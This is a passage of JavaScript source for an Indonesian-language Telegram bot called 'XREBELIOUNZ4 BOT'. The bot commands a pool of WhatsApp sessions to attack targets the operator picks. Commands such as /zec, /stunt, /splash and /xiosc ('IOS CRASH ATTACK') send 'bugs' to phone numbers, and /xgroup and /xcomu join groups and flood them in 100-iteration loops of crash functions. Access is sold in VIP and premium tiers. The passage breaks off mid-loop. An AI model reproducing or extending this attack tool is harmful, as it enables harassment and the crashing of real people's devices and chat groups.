  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses.");
  }

  if (!targetId || isNaN(targetId)) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh: /delvip 123456");
  }

  const vipData = loadVipData();

  if (!vipData[targetId]) {
    return bot.sendMessage(chatId, `⚠️ User ID ${targetId} tidak ditemukan dalam daftar VIP.`);
  }

  delete vipData[targetId];
  saveVipData(vipData);

  await bot.sendMessage(chatId, `✅ VIP berhasil dihapus:\n🆔 ID: ${targetId}`);
});


bot.onText(/\/premiumonly (.+)/, async (msg, match) => {
  handleOnlyAccess(msg, match[1], "premiumOnly");
});

bot.onText(/\/viponly (.+)/, async (msg, match) => {
  handleOnlyAccess(msg, match[1], "vipOnly");
});

bot.onText(/\/owneronly (.+)/, async (msg, match) => {
  handleOnlyAccess(msg, match[1], "ownerOnly");
});

function removePremiumUser(userId){
 const premiumData = loadPremiumData();
 
 if (!premiumData[userId]){
  return false;
 }
delete premiumData[userId];
savePremiumData(premiumData);
return true;
}
bot.onText(/\/delprem(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = match[1].trim();

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "Anda tidak memiliki akses", {
      parse_mode: "Markdown",
    });
  }

  if (!userId) {
    return bot.sendMessage(
      chatId,
      "Usage: /delprem <id>\nContoh: /delprem 123456",
      { parse_mode: "Markdown" }
    );
  }

  const success = removePremiumUser(userId);

  if (success) {
    await bot.sendMessage(chatId, `User premium dihapus\nID: ${userId}`, {
      parse_mode: "Markdown",
    });
  } else {
    await bot.sendMessage(chatId, `User tidak ditemukan`, {
      parse_mode: "Markdown",
    });
  }
});

bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  
  if (!isGlobalOwner) {
    return bot.sendMessage(chatId, "❌ Anda bukan owner.");
  }

  const newOwnerId = Number(match[1].trim());
  if (!newOwnerId || isNaN(newOwnerId)) {
    return bot.sendMessage(chatId, "Format salah!\nContoh: /addowner 123456");
  }

  const data = loadOwnerData();
  if (data.owners.includes(newOwnerId)) {
    return bot.sendMessage(chatId, "ID tersebut sudah menjadi owner.");
  }

  data.owners.push(newOwnerId);
  saveOwnerData(data);

  bot.sendMessage(chatId, `✅ Owner berhasil ditambahkan:\nID: ${newOwnerId}`);
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  if (!isGlobalOwner) {
    return bot.sendMessage(chatId, "❌ Anda bukan owner.");
  }
  const delId = Number(match[1].trim());
  const data = loadOwnerData();

  if (!data.owners.includes(delId)) {
    return bot.sendMessage(chatId, "ID tersebut bukan owner.");
  }

  data.owners = data.owners.filter((id) => id !== delId);
  saveOwnerData(data);

  bot.sendMessage(chatId, `Owner berhasil dihapus:\nID: ${delId}`);
});



bot.onText(/\/zec (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let isVipOnly = false;
  let isPremOnly = false;
  let isOwnerOnly = false;
 
 const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  try {
    const settingsPath = path.join(__dirname, "database", "settings.json");
    if (fs.existsSync(settingsPath)) {
      const settings = JSON.parse(fs.readFileSync(settingsPath));
      isVipOnly = settings.vipOnly?.includes("zec");
      isPremOnly = settings.premiumOnly?.includes("zec");
      isOwnerOnly = settings.ownerOnly?.includes("zec");
    }
  } catch (err) {
    console.error("Gagal membaca settings.json:", err);
  }

  if (isOwnerOnly && !isOwner(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
      parse_mode: "Markdown",
    });
  }

  if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, " *Command ini hanya untuk VIP.*", {
      parse_mode: "Markdown",
    });
  }

  if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
      parse_mode: "Markdown",
    });
  }

 if (isGlobalCooldown && isPremium(userId) && !isVip(userId) && !isOwner(userId)) {
  if (cooldownMap[userId] && cooldownMap[userId] > Date.now()) {
    const sisa = Math.ceil((cooldownMap[userId] - Date.now()) / 1000);
    return bot.sendMessage(chatId, `Anda sedang cooldown!\nCoba lagi dalam *${sisa} detik*.`, {
      parse_mode: "Markdown"
    });
  }

  cooldownMap[userId] = Date.now() + globalCooldownMs;
}

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `bulldozer_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, sending, {
    caption: `\`\`\`
╭═════════════════⚉
│ ⚘ ZEC ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰═════════════════⚉
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: options.reply_markup,
  });
});

bot.onText(/\/xgroup (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak*\nCommand ini hanya untuk pengguna Premium/VIP/Owner.",
      { parse_mode: "Markdown" }
    );
  }

  const input = match[1].trim();
  const inviteCode = input.match(/chat\.whatsapp\.com\/([\w\d]+)/i)?.[1];

  if (!inviteCode) {
    return bot.sendMessage(
      chatId,
      "❌ *Link grup tidak valid.*\nContoh:\n/xgroup https://chat.whatsapp.com/XXXXX",
      { parse_mode: "Markdown" }
    );
  }

  let joinedBots = 0;
  let failedBots = 0;

const settingsPath = path.join(__dirname, "database", "settings.json");
let isVipOnly = false;
let isPremOnly = false;
let isOwnerOnly = false;

if (fs.existsSync(settingsPath)) {
  const settings = JSON.parse(fs.readFileSync(settingsPath));
  isVipOnly = settings.vipOnly?.includes("xgroup");
  isPremOnly = settings.premiumOnly?.includes("xgroup");
  isOwnerOnly = settings.ownerOnly?.includes("xgroup");
}

// Akses validasi
if (isOwnerOnly && !isOwner(userId)) {
        return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
          parse_mode: "Markdown",
        });
      }

if (isVipOnly && !isLocalOwner && !isVip(userId)) {
  return bot.sendMessage(chatId, "*Command ini hanya untuk VIP.*", {
    parse_mode: "Markdown"
  });
}

if (isPremOnly && !isLocalOwner && !isPremium(userId)) {
  return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
    parse_mode: "Markdown"
  });
}

if (isGlobalCooldown && isPremium(userId) && !isVip(userId) && !isOwner(userId)) {
  if (cooldownMap[userId] && cooldownMap[userId] > Date.now()) {
    const sisa = Math.ceil((cooldownMap[userId] - Date.now()) / 1000);
    return bot.sendMessage(chatId, `Anda sedang cooldown!\nCoba lagi dalam *${sisa} detik*.`, {
      parse_mode: "Markdown"
    });
  }

  cooldownMap[userId] = Date.now() + globalCooldownMs;
}

for (const [botNumber, sheesh] of sessions.entries()) {
  try {
    const result = await sheesh.groupAcceptInvite(inviteCode);
    if (result) joinedBots++;
    else failedBots++;
  } catch (err) {
    failedBots++;
  }
}


  // Hasil akhir
  await bot.sendPhoto(chatId, sending, {
    caption: `\`\`\`
╭═════════════════⚉
│ ⚘ XGROUP REPORT ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Link : ${input}
│ Total Bots : ${sessions.size}
│ Success : ${joinedBots}
│ Failed : ${failedBots}
╰═════════════════⚉
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `xgroup_${inviteCode}` }]
      ]
    }
  });
});
bot.onText(/\/xcomu (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const input = match[1].trim();
  const inviteCode = input.match(/chat\.whatsapp\.com\/([\w\d]+)/i)?.[1];

  if (!inviteCode) {
    return bot.sendMessage(chatId, "❌ Link grup tidak valid.\nContoh: /xcomu https://chat.whatsapp.com/XXXX", {
      parse_mode: "Markdown"
    });
  }

  // Cek akses dasar dulu
  if (!isOwner(userId) && !isPremium(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, '❌ Akses ditolak. Fitur ini hanya untuk Premium/VIP/Owner.');
  }

  let joined = 0;
  let failed = 0;

  
      // Default flags
      let isVipOnly = false;
      let isPremOnly = false;
      let isOwnerOnly = false;

      // Baca settings
      const settingsPath = path.join(__dirname, "database", "settings.json");
      if (fs.existsSync(settingsPath)) {
        const settings = JSON.parse(fs.readFileSync(settingsPath));
        isVipOnly = settings.vipOnly?.includes("xcomu");
        isPremOnly = settings.premiumOnly?.includes("xcomu");
        isOwnerOnly = settings.ownerOnly?.includes("xcomu");
      }

      // Validasi lanjutan per-bot
      if (isOwnerOnly && !isOwner(userId)) {
        return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
          parse_mode: "Markdown",
        });
      }

      if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
        return bot.sendMessage(chatId, "*Command ini hanya untuk pengguna VIP.*", {
          parse_mode: "Markdown",
        });
      }

      if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
        return bot.sendMessage(chatId, "*Command ini hanya untuk pengguna Premium.*", {
          parse_mode: "Markdown",
        });
      }

      if (isGlobalCooldown && isPremium(userId) && !isVip(userId) && !isOwner(userId)) {
  if (cooldownMap[userId] && cooldownMap[userId] > Date.now()) {
    const sisa = Math.ceil((cooldownMap[userId] - Date.now()) / 1000);
    return bot.sendMessage(chatId, `Anda sedang cooldown!\nCoba lagi dalam *${sisa} detik*.`, {
      parse_mode: "Markdown"
    });
  }

  cooldownMap[userId] = Date.now() + globalCooldownMs;
}

      // Proses join group
      for (const [botNum, sheesh] of sessions.entries()) {
    try {
      const info = await sheesh.groupAcceptInvite(inviteCode);
      if (info) joined++;
      else failed++;
    } catch (err) {
      console.error(`Gagal join oleh bot ${botNum}:`, err);
      failed++;
    }
  }

  // Kirim laporan hasil
  await bot.sendPhoto(chatId, sending, {
    caption: `\`\`\`
╭═════════════════⚉
│ ⚘ XCOMU REPORT ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Link : ${input}
│ Total Bots : ${sessions.size}
│ Success : ${joined}
│ Failed : ${failed}
╰═════════════════⚉
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `xcomu_${inviteCode}` }]
      ]
    }
  });
});

bot.onText(/\/multimate (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let isVipOnly = false;
  let isPremOnly = false;
  let isOwnerOnly = false;
 
 const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  try {
    const settingsPath = path.join(__dirname, "database", "settings.json");
    if (fs.existsSync(settingsPath)) {
      const settings = JSON.parse(fs.readFileSync(settingsPath));
      isVipOnly = settings.vipOnly?.includes("multimate");
      isPremOnly = settings.premiumOnly?.includes("multimate");
      isOwnerOnly = settings.ownerOnly?.includes("multimate");
    }
  } catch (err) {
    console.error("Gagal membaca settings.json:", err);
  }

  if (isOwnerOnly && !isOwner(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
      parse_mode: "Markdown",
    });
  }

  if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, " *Command ini hanya untuk VIP.*", {
      parse_mode: "Markdown",
    });
  }

  if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
      parse_mode: "Markdown",
    });
  }

  if (isGlobalCooldown && isPremium(userId) && !isVip(userId) && !isOwner(userId)) {
  if (cooldownMap[userId] && cooldownMap[userId] > Date.now()) {
    const sisa = Math.ceil((cooldownMap[userId] - Date.now()) / 1000);
    return bot.sendMessage(chatId, `Anda sedang cooldown!\nCoba lagi dalam *${sisa} detik*.`, {
      parse_mode: "Markdown"
    });
  }

  cooldownMap[userId] = Date.now() + globalCooldownMs;
}

  const input = match[1];
  const rawNumbers = input.split(",");
  const targets = rawNumbers
    .map((n) => n.replace(/[^0-9]/g, ""))
    .filter((n) => n.length > 5);

  if (targets.length === 0) {
    return bot.sendMessage(
      chatId,
      "❌ *Format salah.*\nGunakan format:\n`/multimate 6281234,6285678,...`",
      { parse_mode: "Markdown" }
    );
  }

  const callbackData = `multimate_${targets.join("_")}`;

  const caption = `\`\`\`
╭═════════════════⚉
│ ⚘ MULTIMATE ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Total Target : ${targets.length}
│ Bot Ready    : ${sessions.size}
╰═════════════════⚉
\`\`\``;

  await bot.sendPhoto(chatId, sending, {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: callbackData }]
      ],
    },
  });
});

bot.onText(/\/stunt (\d+)\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let isVipOnly = false;
  let isPremOnly = false;
  let isOwnerOnly = false;

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  try {
    const settingsPath = path.join(__dirname, "database", "settings.json");
    if (fs.existsSync(settingsPath)) {
      const settings = JSON.parse(fs.readFileSync(settingsPath));
      isVipOnly = settings.vipOnly?.includes("stunt");
      isPremOnly = settings.premiumOnly?.includes("stunt");
      isOwnerOnly = settings.ownerOnly?.includes("stunt");
    }
  } catch (err) {
    console.error("Gagal membaca settings.json:", err);
  }

  if (isOwnerOnly && !isOwner(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
      parse_mode: "Markdown",
    });
  }

  if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk VIP.*", {
      parse_mode: "Markdown",
    });
  }

  if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
      parse_mode: "Markdown",
    });
  }

  if (isGlobalCooldown && isPremium(userId) && !isVip(userId) && !isOwner(userId)) {
    if (cooldownMap[userId] && cooldownMap[userId] > Date.now()) {
      const sisa = Math.ceil((cooldownMap[userId] - Date.now()) / 1000);
      return bot.sendMessage(chatId, `Anda sedang cooldown!\nCoba lagi dalam *${sisa} detik*.`, {
        parse_mode: "Markdown"
      });
    }
    cooldownMap[userId] = Date.now() + globalCooldownMs;
  }

  const target = match[1].replace(/[^0-9]/g, "");
  const rawDuration = match[2].trim().toLowerCase();

  let durationMs;
  if (rawDuration.endsWith("jam")) {
    const jam = parseInt(rawDuration);
    if (isNaN(jam) || jam <= 0) {
      return bot.sendMessage(chatId, "❌ Durasi tidak valid (contoh: `3jam`)", {
        parse_mode: "Markdown",
      });
    }
    durationMs = jam * 60 * 60 * 1000;
  } else if (rawDuration.endsWith("menit")) {
    const menit = parseInt(rawDuration);
    if (isNaN(menit) || menit <= 0) {
      return bot.sendMessage(chatId, "❌ Durasi tidak valid (contoh: `30menit`)", {
        parse_mode: "Markdown",
      });
    }
    durationMs = menit * 60 * 1000;
  } else {
    return bot.sendMessage(chatId, "❌ Format durasi salah.\nGunakan `3jam` atau `30mnt`", {
      parse_mode: "Markdown",
    });
  }

  const caption = `\`\`\`
╭═════════════════⚉
│ ⚘ STUNT ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Target   : ${target}
│ Durasi   : ${rawDuration}
│ Bot Ready: ${sessions.size}
╰═════════════════⚉
\`\`\``;

  await bot.sendPhoto(chatId, sending, {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `stunt_${target}_${durationMs}_${rawDuration}` }]
      ]
    }
  });
});

bot.onText(/\/splash (\d+)\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let isVipOnly = false;
  let isPremOnly = false;
  let isOwnerOnly = false;

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  try {
    const settingsPath = path.join(__dirname, "database", "settings.json");
    if (fs.existsSync(settingsPath)) {
      const settings = JSON.parse(fs.readFileSync(settingsPath));
      isVipOnly = settings.vipOnly?.includes("splash");
      isPremOnly = settings.premiumOnly?.includes("splash");
      isOwnerOnly = settings.ownerOnly?.includes("splash");
    }
  } catch (err) {
    console.error("Gagal membaca settings.json:", err);
  }

  if (isOwnerOnly && !isOwner(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
      parse_mode: "Markdown",
    });
  }

  if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk VIP.*", {
      parse_mode: "Markdown",
    });
  }

  if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
      parse_mode: "Markdown",
    });
  }

  if (isGlobalCooldown && isPremium(userId) && !isVip(userId) && !isOwner(userId)) {
    if (cooldownMap[userId] && cooldownMap[userId] > Date.now()) {
      const sisa = Math.ceil((cooldownMap[userId] - Date.now()) / 1000);
      return bot.sendMessage(chatId, `Anda sedang cooldown!\nCoba lagi dalam *${sisa} detik*.`, {
        parse_mode: "Markdown"
      });
    }
    cooldownMap[userId] = Date.now() + globalCooldownMs;
  }

  const target = match[1].replace(/[^0-9]/g, "");
  const rawDuration = match[2].trim().toLowerCase();

  let durationMs;
  if (rawDuration.endsWith("jam")) {
    const jam = parseInt(rawDuration);
    if (isNaN(jam) || jam <= 0) {
      return bot.sendMessage(chatId, "❌ Durasi tidak valid (contoh: `3jam`)", {
        parse_mode: "Markdown",
      });
    }
    durationMs = jam * 60 * 60 * 1000;
  } else if (rawDuration.endsWith("menit")) {
    const menit = parseInt(rawDuration);
    if (isNaN(menit) || menit <= 0) {
      return bot.sendMessage(chatId, "❌ Durasi tidak valid (contoh: `30menit`)", {
        parse_mode: "Markdown",
      });
    }
    durationMs = menit * 60 * 1000;
  } else {
    return bot.sendMessage(chatId, "❌ Format durasi salah.\nGunakan `3jam` atau `30mnt`", {
      parse_mode: "Markdown",
    });
  }

  const caption = `\`\`\`
╭═════════════════⚉
│ ⚘ SPLASH ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Target   : ${target}
│ Durasi   : ${rawDuration}
│ Bot Ready: ${sessions.size}
╰═════════════════⚉
\`\`\``;

  await bot.sendPhoto(chatId, sending, {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `splash_${target}_${durationMs}_${rawDuration}` }]
      ]
    }
  });
});

bot.onText(/\/xiosc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let isVipOnly = false;
  let isPremOnly = false;
  let isOwnerOnly = false;
 
 const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }
  
try {
    const settingsPath = path.join(__dirname, "database", "settings.json");
    if (fs.existsSync(settingsPath)) {
      const settings = JSON.parse(fs.readFileSync(settingsPath));
      isVipOnly = settings.vipOnly?.includes("xiosc");
      isPremOnly = settings.premiumOnly?.includes("xiosc");
      isOwnerOnly = settings.ownerOnly?.includes("xiosc");
    }
  } catch (err) {
    console.error("Gagal membaca settings.json:", err);
  }

  if (isOwnerOnly && !isOwner(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
      parse_mode: "Markdown",
    });
  }

  if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, " *Command ini hanya untuk VIP.*", {
      parse_mode: "Markdown",
    });
  }

  if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
      parse_mode: "Markdown",
    });
  }

  if (isGlobalCooldown && isPremium(userId) && !isVip(userId) && !isOwner(userId)) {
  if (cooldownMap[userId] && cooldownMap[userId] > Date.now()) {
    const sisa = Math.ceil((cooldownMap[userId] - Date.now()) / 1000);
    return bot.sendMessage(chatId, `Anda sedang cooldown!\nCoba lagi dalam *${sisa} detik*.`, {
      parse_mode: "Markdown"
    });
  }

  cooldownMap[userId] = Date.now() + globalCooldownMs;
}

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `xiosc_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, sending, {
    caption: `\`\`\`
╭═════════════════⚉
│ ⚘ IOS CRASH ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰═════════════════⚉\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/xiosi (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let isVipOnly = false;
  let isPremOnly = false;
  let isOwnerOnly = false;
 
 const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  try {
    const settingsPath = path.join(__dirname, "database", "settings.json");
    if (fs.existsSync(settingsPath)) {
      const settings = JSON.parse(fs.readFileSync(settingsPath));
      isVipOnly = settings.vipOnly?.includes("xiosi");
      isPremOnly = settings.premiumOnly?.includes("xiosi");
      isOwnerOnly = settings.ownerOnly?.includes("xiosi");
    }
  } catch (err) {
    console.error("Gagal membaca settings.json:", err);
  }

  if (isOwnerOnly && !isOwner(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
      parse_mode: "Markdown",
    });
  }

  if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, " *Command ini hanya untuk VIP.*", {
      parse_mode: "Markdown",
    });
  }

  if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
      parse_mode: "Markdown",
    });
  }

  if (isGlobalCooldown && isPremium(userId) && !isVip(userId) && !isOwner(userId)) {
  if (cooldownMap[userId] && cooldownMap[userId] > Date.now()) {
    const sisa = Math.ceil((cooldownMap[userId] - Date.now()) / 1000);
    return bot.sendMessage(chatId, `Anda sedang cooldown!\nCoba lagi dalam *${sisa} detik*.`, {
      parse_mode: "Markdown"
    });
  }

  cooldownMap[userId] = Date.now() + globalCooldownMs;
}

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `xiosi_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, sending, {
    caption: `\`\`\`
╭═════════════════⚉
│ ⚘ IOS INVISIBLE ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰═════════════════⚉\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});



// Modular refactored callback_query handler
bot.on("callback_query", async (query) => {
  const data = query.data;
  if (!data || !query.message) return;

  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const name = query.from.username || query.from.first_name;
  const [action, ...params] = data.split("_");

  let successCount = 0;
  let failCount = 0;
  let resultCaption = "";

  try {
    if (data === "menu1") {
      return bot.editMessageCaption(
        `\
\`\`\`
╭══════════════════⚉ 
│⚘ 𝗫𝗥𝗘𝗕𝗘𝗟𝗜𝗢𝗨𝗡𝗭𝟰 𝗕𝗢𝗧 ⚘
│    𝖵𝖤𝖱𝖲𝖨𝖮𝖭 𝟦.𝟧 𝖲𝖵𝖵𝖨𝖯
╰══════════════════⚉
╭═════════════════⚉
│ ⚘ BUG MENU ⚘
│ ⚉ /zec <number>
│ ⚉ /multimate <number1>,<number2>
│ ⚉ /stunt <number> <3jam>
│ ⚉ /splash <number>
│ ⚉ /xiosc <number>
│ ⚉ /xiosi <number>
│ ⚉ /xgrup <link-group>
│ ⚉ /xcomu <link-group>
╰═════════════════⚉
╭══════════════════⚉ 
│⚘ 𝗫𝗥𝗘𝗕𝗘𝗟𝗜𝗢𝗨𝗡𝗭𝟰 𝗕𝗢𝗧 ⚘
│    𝖵𝖤𝖱𝖲𝖨𝖮𝖭 𝟦.𝟧 𝖲𝖵𝖵𝖨𝖯
╰══════════════════⚉
\`\`\``,
        {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[{ text: "BACK", callback_data: `backmenu` }]],
          },
        }
      );
    }

    if (data === "backmenu") {
      return bot.editMessageCaption(
        `\`\`\`
𝖲𝖫𝖨𝖯𝖤𝖱𝖸/𝖵𝖤𝖱𝖲𝖨𝖮𝖭
╭══════════════════⚉ 
│⚘ 𝗫𝗥𝗘𝗕𝗘𝗟𝗜𝗢𝗨𝗡𝗭𝟰 𝗕𝗢𝗧 ⚘
│    𝖵𝖤𝖱𝖲𝖨𝖮𝖭 𝟦.𝟧 𝖲𝖵𝖵𝖨𝖯
╰══════════════════⚉
╭═════════════════⚉
│ ⚉ /menu
╰═════════════════⚉
╭═════════════════⚉
│   ⚘ 𝖶𝖤𝖫𝖢𝖮𝖬𝖤 @${name} ⚘
╰═════════════════⚉
\`\`\``,
        {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[{ text: "⚘ CHANNELS", url: "https://t.me/onlyRaa4Sx" }]],
          },
        }
      );
    }

    const jid = params[0]?.includes("@s.whatsapp.net") ? params[0] : `${params[0]}@s.whatsapp.net`;

    if (["xiosc", "xiosi", "splash", "bulldozer"].includes(action)) {
      for (let step = 0; step <= 4; step++) {
        const percentage = (step / 4) * 100;
        const progressBar = "▓▓▓".repeat(step) + "░░░".repeat(4 - step);
        const isProcessing = percentage < 100;
        await bot.editMessageCaption(
          `\`\`\`
╭──────────────────────
│   ${isProcessing ? "      WAIT        " : "    PROCESSING     "}
│──────────────────────
│ Target: ${params[0]}
│ ${
            isProcessing
              ? `Loading: [${progressBar} ${percentage.toFixed(0)}%]`
              : "Status: Sending Bug..."
          }
╰──────────────────────\`\`\``,
          {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
          }
        );
        await new Promise((r) => setTimeout(r, 500));
      }
    }

    for (const [botNum, sheesh] of sessions.entries()) {
      try {
        switch (action) {
          case "xgroup": {
            const inviteCode = params.join("_");
            const meta = await sheesh.groupGetInviteInfo(inviteCode);
            if (!meta?.id) continue;
            for (let i = 0; i < 100; i++) {
              await GroupUi(sheesh, meta.id);
              await SnitchDelayVolteX(sheesh, meta.id);
              await sleep(1000);
            }
            resultCaption = `\`\`\`
╭═════════════════⚉
│ ⚘ GROUP ATTACK  ⚘
╰═════════════════⚉
│ Link : https://chat.whatsapp.com/${inviteCode}
│ Group ID : ${meta.id}
│ Success : 1
╰═════════════════⚉
\`\`\``;
            break;
          }
          case "xcomu": {
            const inviteCode = params.join("_");
            const meta = await sheesh.groupGetInviteInfo(inviteCode);
            if (!meta?.id) continue;
            const metadata = await sheesh.groupMetadata(meta.id);
            const isCommunity = !!metadata?.parentGroupId;
            const target = metadata?.parentGroupId || meta.id;
            for (let i = 0; i < 100; i++) {
              await GroupUi(sheesh, meta.id);
              await SnitchDelayVolteX(sheesh, meta.id);
              await sleep(1000);
            }
            resultCaption = `\`\`\`
╭═════════════════⚉
│ ⚘ XCOMU ATTACK ⚘
╰═════════════════⚉
│ Link : https://chat.whatsapp.com/${inviteCode}
│ Parent : ${isCommunity ? "✅ Ya" : "❌ Tidak"}
│ Target ID : ${meta.id}
│ Success : 1
╰═════════════════⚉
\`\`\``;
            break;
          }
          case "xiosi":
            for (let i = 0; i < 100; i++) 
            await iosInVis(sheesh, target);
            await sleep(1000);
